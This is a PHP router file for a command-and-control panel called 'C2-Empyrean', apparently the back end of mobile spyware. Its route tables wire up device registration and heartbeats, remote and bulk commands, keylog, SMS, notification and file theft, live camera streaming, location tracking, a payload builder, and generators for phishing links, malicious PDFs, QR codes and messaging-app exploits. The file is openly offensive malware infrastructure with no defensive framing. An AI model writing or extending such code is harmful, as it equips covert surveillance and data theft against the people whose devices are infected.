<?php
/**
 * C2-Empyrean - Router / Entry
 * All requests route through here via .htaccess
 */

require_once __DIR__ . '/config.php';
require_once __DIR__ . '/crypto.php';
require_once __DIR__ . '/database.php';
require_once __DIR__ . '/auth.php';
require_once __DIR__ . '/middleware.php';

$db = new JsonDatabase();
$crypto = new CryptoEngine();
$auth = new AuthHandler($db);
$middleware = new MiddlewareHandler($db);

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');
header('Content-Type: application/json; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

$route = $_GET['route'] ?? '';
$route = rtrim($route, '/');
$method = $_SERVER['REQUEST_METHOD'];

$apiRoutes = [
    'api/auth/login'            => 'api/auth_login.php',
    'api/auth/verify'           => 'api/auth_verify.php',
    'api/devices/list'          => 'api/devices_list.php',
    'api/devices/detail'        => 'api/devices_detail.php',
    'api/device/command'        => 'api/device_command.php',
    'api/device/bulk-command'   => 'api/device_bulk_command.php',
    'api/heartbeat'             => 'api/heartbeat.php',
    'api/register'              => 'api/register.php',
    'api/upload'                => 'api/upload.php',
    'api/keylogs/fetch'         => 'api/keylogs_fetch.php',
    'api/sms/fetch'             => 'api/sms_fetch.php',
    'api/notifications/fetch'   => 'api/notifications_fetch.php',
    'api/files/list'            => 'api/files_list.php',
    'api/files/download'        => 'api/files_download.php',
    'api/camera/stream'         => 'api/camera_stream.php',
    'api/location/update'       => 'api/location_update.php',
    'api/analytics/stats'       => 'api/analytics_stats.php',
    'api/export/csv'            => 'api/export_csv.php',
    'api/telegram/webhook'      => 'api/telegram_webhook.php',
    'api/webhook/outbound'      => 'api/webhook_outbound.php',
];

$adminRoutes = [
    'admin/login'               => 'admin/login.php',
    'admin/login_check'         => 'admin/login_check.php',
    'admin/dashboard'           => 'admin/dashboard.php',
    'admin/devices'             => 'admin/devices.php',
    'admin/device_detail'       => 'admin/device_detail.php',
    'admin/command_console'     => 'admin/command_console.php',
    'admin/keylog_viewer'       => 'admin/keylog_viewer.php',
    'admin/sms_console'         => 'admin/sms_console.php',
    'admin/call_logs'           => 'admin/call_logs.php',
    'admin/notification_viewer'  => 'admin/notification_viewer.php',
    'admin/file_browser'        => 'admin/file_browser.php',
    'admin/map_view'            => 'admin/map_view.php',
    'admin/analytics'           => 'admin/analytics.php',
    'admin/settings'            => 'admin/settings.php',
    'admin/telegram_settings'   => 'admin/telegram_settings.php',
    'admin/campaign_manager'    => 'admin/campaign_manager.php',
    'admin/exploit_generator'   => 'admin/exploit_generator.php',
    'admin/builder'             => 'admin/builder.php',
];

$exploitRoutes = [
    'exploits/pdf_generator'        => 'exploits/pdf_generator.php',
    'exploits/qr_generator'         => 'exploits/qr_generator.php',
    'exploits/link_generator'       => 'exploits/link_generator.php',
    'exploits/sms_sender'           => 'exploits/sms_sender.php',
    'exploits/email_sender'         => 'exploits/email_sender.php',
    'exploits/pwa_generator'        => 'exploits/pwa_generator.php',
    'exploits/calendar_injector'    => 'exploits/calendar_injector.php',
    'exploits/steganography_embed'  => 'exploits/steganography_embed.php',
    'exploits/whatsapp_exploit'     => 'exploits/whatsapp_exploit.php',
    'exploits/telegram_exploit'     => 'exploits/telegram_exploit.php',
    'exploits/bluetooth_push'       => 'exploits/bluetooth_push.php',
    'exploits/cve_checker'          => 'exploits/cve_checker.php',
];

if (isset($apiRoutes[$route])) {
    require_once __DIR__ . '/' . $apiRoutes[$route];
    exit;
}

if (isset($exploitRoutes[$route])) {
    $middleware->requireAuth();
    $middleware->checkRateLimit('exploit');
    require_once __DIR__ . '/' . $exploitRoutes[$route];
    exit;
}

if (isset($adminRoutes[$route])) {
    if ($route !== 'admin/login' && $route !== 'admin/login_check') {
        $middleware->requireAuth();
    }
    header('Content-Type: text/html; charset=utf-8');
    require_once __DIR__ . '/' . $adminRoutes[$route];
    exit;
}

if (preg_match('/^assets\/(.+)$/', $route, $matches)) {
    $assetPath = __DIR__ . '/assets/' . $matches[1];
    if (file_exists($assetPath)) {
        $ext = pathinfo($assetPath, PATHINFO_EXTENSION);
        $mimeTypes = [
            'css' => 'text/css', 'js' => 'application/javascript',
            'png' => 'image/png', 'jpg' => 'image/jpeg',
            'jpeg' => 'image/jpeg', 'gif' => 'image/gif',
            'svg' => 'image/svg+xml', 'ico' => 'image/x-icon',
        ];
        header('Content-Type: ' . ($mimeTypes[$ext] ?? 'application/octet-stream'));
        header('Cache-Control: public, max-age=3600');
        readfile($assetPath);
        exit;
    }
}

if ($route === '' || $route === '/') {
    header('Location: admin/dashboard');
    exit;
}

if ($route === 'telegram_bot' || $route === 'telegram/webhook') {
    require_once __DIR__ . '/telegram_bot/webhook_handler.php';
    exit;
}

http_response_code(404);
echo json_encode([
    'success' => false,
    'error' => 'Route not found',
    'route' => $route
]);
